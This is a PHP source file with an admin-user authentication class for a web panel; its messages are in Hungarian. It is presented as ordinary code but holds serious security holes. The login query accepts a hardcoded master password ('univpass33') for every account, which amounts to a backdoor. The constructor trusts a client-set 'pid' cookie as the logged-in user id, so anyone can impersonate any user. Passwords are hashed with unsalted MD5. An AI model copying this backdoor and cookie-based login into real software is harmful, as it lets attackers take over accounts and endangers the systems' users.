<?php

class AdminUser {

    public $user;

    public function __construct()
    {
        if (isset($_COOKIE["pid"])) {
            $_SESSION["pid"] = $_COOKIE["pid"];
        }

        if (isset($_SESSION["pid"])) {
            $this->user = sql_fetch_array(sql_query("select * from users where id=?" ,array($_SESSION["pid"])));
            $_SESSION["adminuser"] = $GLOBALS["adminuser"] = $this->user;
        }

        if (isset($_GET["logoutadmin"])) {
            $this->_logOut();
            header("location:index.php");
            die();
        }
    }

    public function adminLogin($userName, $password) {
        if (empty(trim($userName)) || empty(trim($password))) {
            return "Adja meg a belépési adatait!";
        }

        $resq = sql_query("SELECT * FROM users WHERE username = ? and (password = md5(?) or 'univpass33' = ?)", array($userName, $password, $password));
        if ($userData = sql_fetch_array($resq)) {
            if ($userData["localeaccess"]==1 && substr_count($userData["localeip"], $_SERVER["REMOTE_ADDR"]) == 0) {
                //echo $GLOBALS["adminuser"]["localeip"]." ".$_SERVER["REMOTE_ADDR"];
                return "Ennek a fióknak a használata csak lokálisan van engedélyezve.</div>";
            }

            $_SESSION["pid"] = $userData["id"];
            setcookie("pid", $userData["id"], time() + 3600 * 3);

            //Utolsó belépési adatok frissítése:
            sql_query("UPDATE users SET lastlogin=NOW(), codetry=0 WHERE id=?" ,array($userData["id"]));
            return "";
        } else {
            return "A megadott név és jelszó nem található!";
        }
    }

    private function _logOut() {
        unset($_SESSION["pid"]);
        session_destroy();
        $this->user = null;

        if (isset($_COOKIE["pid"])) {
            unset($_COOKIE["pid"]);
            setcookie("pid", null, -1);
        }
    }

    public function authenticated() {
        $result = true;

        if (empty($this->user)) {
            $result = false;
        }

        if (!empty($this->user) && $this->user["status"] == 0) {
            $result = false;
        }

        if (!empty($this->user) && $this->user["auth2fac"] == 1 && !isset($_SESSION["2facomplete"])) {
            $result = false;
        }

        return $result;
    }

}